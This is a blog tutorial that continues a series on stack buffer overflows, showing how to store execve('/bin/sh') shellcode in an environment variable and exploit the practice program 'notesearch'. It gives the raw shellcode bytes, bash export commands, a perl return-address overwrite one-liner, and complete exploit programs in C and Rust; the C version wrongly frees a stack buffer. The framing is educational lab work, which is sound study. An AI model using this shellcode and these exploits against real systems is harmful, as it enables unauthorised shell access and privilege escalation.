<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/store-shellcode-in-environment-variable"><!-- Primary Meta Tags --><title>Store shellcode in environment variable</title><meta name="title" content="Store shellcode in environment variable"><meta name="description" content="Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/store-shellcode-in-environment-variable"><meta property="og:title" content="Store shellcode in environment variable"><meta property="og:description" content="Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows."><meta property="og:image" content="https://danielorihuela.dev/_astro/shellcode-env-var.CG5A6neK.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/store-shellcode-in-environment-variable"><meta property="twitter:title" content="Store shellcode in environment variable"><meta property="twitter:description" content="Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/shellcode-env-var.CG5A6neK.jpg"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BdnWl1ph.css">
<link rel="stylesheet" href="/_astro/_slug_.wqGeQQNF.css">
<style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
</style><script type="module" src="/_astro/hoisted.DNq6m-fi.js"></script></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
DO
<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav>  </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/shellcode-env-var.CG5A6neK_2gi6f2.webp" class="rounded-xl shadow-ba" alt="" width="888" height="888" loading="lazy" decoding="async"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2023-10-29T00:00:00.000Z"> Oct 29, 2023 </time> </div> <h1 class="font-[Iceland]"> Store shellcode in environment variable </h1> <hr> </div>  <ul>
<li><a href="#manually-store-shellcode-in-env-var">Manually store shellcode in env
var</a></li>
<li><a href="#automating-the-attack">Automating the attack</a></li>
</ul>
<p>In the <a href="../stack-based-buffer-overflows">previous post</a> we explained how
stack-based buffer overflows work. In the last exercise, we inserted the
shellcode in the stack. However, this might be a problem. What happens
if the shellcode doesn’t fit in the stack? We can store it in an
environment variable.</p>
<h1 id="manually-store-shellcode-in-env-var">Manually store shellcode in env var</h1>
<p>We will export the shellcode manually and use it in our exploit.</p>
<p>Let’s keep working with the <code>notesearch</code> program (the last exercise of
the previous post). Remember that the shellcode was
<code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code>.
We need to export it as a binary into the env var. Otherwise, the code
won’t be executed.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> shellcode.bin</span></span>
<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> shellcode.bin</span><span style="color:#F8F8F2">)</span></span>
<span class="line"></span></code></pre>
<p>The terminal will complain about the encoding but don’t worry. It’s
still working.</p>
<p><img  src="/_astro/wrong-encoding.Y8BZaRVv_Z1NO0nb.webp" alt="" width="786" height="129" loading="lazy" decoding="async"></p>
<p>The next step is debugging the exploit and searching the address where
the environment variable is in the stack. Environment variables are in
the lowest positions.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">env</span><span style="color:#F1FA8C"> gdb</span><span style="color:#F1FA8C"> ~/Desktop/overflow/notesearch</span></span>
<span class="line"></span></code></pre>
<p>We can place a break in the main function to inspect the stack frame.</p>
<p><img  src="/_astro/shellcode-location-env-var.BozqwTYq_1RXnjj.webp" alt="" width="673" height="286" loading="lazy" decoding="async"></p>
<p>The shellcode is at <code>0x7fffffffe975</code>. Notice that if the user adds or
removes environment variables, the memory address will change. We can
execute
<code>~/Desktop/overflow/notesearch $(perl -e 'print "\x90" x 120, "\x75\xe9\xff\xff\xff\x7f"')</code>.
Remember, we use the first 120 bytes to reach the return address memory
location.</p>
<p><img  src="/_astro/manual-exploit.CDUaIv29_Z1TAovO.webp" alt="" width="807" height="153" loading="lazy" decoding="async"></p>
<h1 id="automating-the-attack">Automating the attack</h1>
<p>Another advantage of storing the shellcode in an environment variable is
that automating the attack is easier. C
<a href="https://linux.die.net/man/3/execl">execle</a> function allows to execute
files with the given arguments and environment variables.</p>
<p><code>int execle(const char *path, const char *arg,..., char * const envp[]);</code></p>
<p>We can execute the binary with just the shellcode in the environment
variables. Hence, we get rid of other environment variables that could
modify the memory address. We can use gdb, as before, to get the new
memory address. There’s one difference, though. Since we want to debug
the program called with <code>execle</code>, we need to allow gdb to debug it.
Execute <code>set follow-fork-mode child</code> in gdb and add a break to the main
function. It will eventually stop in <code>notesearch</code>. Once there, search
the shellcode in the stack frame as we did before.</p>
<p><img  src="/_astro/follow-child.BKzvjz7N_Z1Q6qsR.webp" alt="" width="832" height="342" loading="lazy" decoding="async"></p>
<p>The exploit in C is quite self-explanatory. We create the argument, the
environment and execute <code>notesearch</code> with them.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">string.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">unistd.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdint.h</span><span style="color:#E9F284">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">char</span><span style="color:#F8F8F2"> shellcode</span><span style="color:#FF79C6">[]=</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">) {</span></span>
<span class="line"><span style="color:#FF79C6">    char</span><span style="color:#F8F8F2"> buffer[</span><span style="color:#BD93F9">120</span><span style="color:#FF79C6"> +</span><span style="color:#BD93F9"> 8</span><span style="color:#F8F8F2">];</span></span>
<span class="line"><span style="color:#50FA7B">    memset</span><span style="color:#F8F8F2">(buffer, </span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">a</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">120</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">    memcpy</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">buffer[</span><span style="color:#BD93F9">120</span><span style="color:#F8F8F2">], </span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\x75\xe9\xff\xff\xff\x7f</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">8</span><span style="color:#F8F8F2">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">    char*</span><span style="color:#F8F8F2"> env[</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">] </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> {shellcode, </span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">};</span></span>
<span class="line"><span style="color:#50FA7B">    execle</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">notesearch</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">./notesearch</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, buffer, </span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">, env);</span></span>
<span class="line"><span style="color:#50FA7B">    free</span><span style="color:#F8F8F2">(buffer);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<p><img  src="/_astro/c-exploit.GhvtsUL8_Z29fwEg.webp" alt="" width="800" height="343" loading="lazy" decoding="async"></p>
<p>The same exploit in Rust.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="rust"><code><span class="line"><span style="color:#FF79C6">use</span><span style="color:#F8F8F2"> std</span><span style="color:#FF79C6">::</span><span style="color:#F8F8F2">ffi</span><span style="color:#FF79C6">::</span><span style="color:#8BE9FD;font-style:italic">OsStr</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">use</span><span style="color:#F8F8F2"> std</span><span style="color:#FF79C6">::</span><span style="color:#F8F8F2">process</span><span style="color:#FF79C6">::</span><span style="color:#8BE9FD;font-style:italic">Command</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">fn</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">() {</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> shellcode </span><span style="color:#FF79C6">=</span><span style="color:#FF79C6"> unsafe</span><span style="color:#F8F8F2"> {</span></span>
<span class="line"><span style="color:#8BE9FD;font-style:italic">        OsStr</span><span style="color:#FF79C6">::</span><span style="color:#50FA7B">from_encoded_bytes_unchecked</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">[</span></span>
<span class="line"><span style="color:#BD93F9">            0x48</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x31</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xf6</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x56</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x48</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xbf</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x2f</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x62</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x69</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x6e</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x2f</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x2f</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x73</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x68</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#BD93F9">            0x57</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x54</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x5f</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x6a</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x3b</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x58</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x99</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x0f</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x05</span><span style="color:#F8F8F2">,</span></span>
<span class="line"><span style="color:#F8F8F2">        ])</span></span>
<span class="line"><span style="color:#F8F8F2">    };</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> shellcode_address </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> [</span><span style="color:#BD93F9">0xd3</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xef</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xff</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xff</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0xff</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x7f</span><span style="color:#F8F8F2">];</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> memory </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> [</span><span style="color:#BD93F9">0x61</span><span style="color:#F8F8F2">; </span><span style="color:#BD93F9">120</span><span style="color:#F8F8F2">]</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">iter</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">chain</span><span style="color:#F8F8F2">(shellcode_address</span><span style="color:#FF79C6">.</span><span style="color:#50FA7B">iter</span><span style="color:#F8F8F2">())</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">map</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">|</span><span style="color:#F8F8F2">x</span><span style="color:#FF79C6">|</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">x </span><span style="color:#FF79C6">as</span><span style="color:#8BE9FD;font-style:italic"> u8</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">collect</span><span style="color:#FF79C6">::</span><span style="color:#F8F8F2">&#x3C;</span><span style="color:#8BE9FD;font-style:italic">Vec</span><span style="color:#F8F8F2">&#x3C;</span><span style="color:#8BE9FD;font-style:italic">u8</span><span style="color:#F8F8F2">>>();</span></span>
<span class="line"><span style="color:#FF79C6">    let</span><span style="color:#F8F8F2"> memory_arg </span><span style="color:#FF79C6">=</span><span style="color:#FF79C6"> unsafe</span><span style="color:#F8F8F2"> { </span><span style="color:#8BE9FD;font-style:italic">OsStr</span><span style="color:#FF79C6">::</span><span style="color:#50FA7B">from_encoded_bytes_unchecked</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">memory) };</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD;font-style:italic">    Command</span><span style="color:#FF79C6">::</span><span style="color:#50FA7B">new</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">"./notesearch"</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">arg</span><span style="color:#F8F8F2">(memory_arg)</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">env_clear</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">env</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">"SHELLCODE"</span><span style="color:#F8F8F2">, shellcode)</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">spawn</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">unwrap</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">wait_with_output</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#FF79C6">        .</span><span style="color:#50FA7B">unwrap</span><span style="color:#F8F8F2">();</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<p><img  src="/_astro/rust-exploit.BE-S7SRY_Z2mtYDE.webp" alt="" width="580" height="113" loading="lazy" decoding="async"></p>  </div> </article> <footer></footer> </body></html>